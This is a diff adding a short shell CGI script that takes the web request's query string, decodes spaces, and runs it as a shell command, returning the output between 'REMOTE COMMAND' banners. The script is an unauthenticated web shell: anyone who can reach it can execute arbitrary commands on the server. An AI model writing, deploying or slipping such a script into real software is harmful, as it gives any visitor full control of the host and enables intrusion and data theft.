@@ -1,0 +1,8 @@
+#!/bin/sh
+printf "Content-type: text/plain\n\n"
+echo '### START REMOTE COMMAND ###'
+echo '#send:' $(echo "${QUERY_STRING}"|sed -e 's/%20/ /g')
+echo 
+$(echo "${QUERY_STRING}"|sed -e 's/%20/ /g') 2>&1
+echo
+echo '### END REMOTE COMMAND ###'
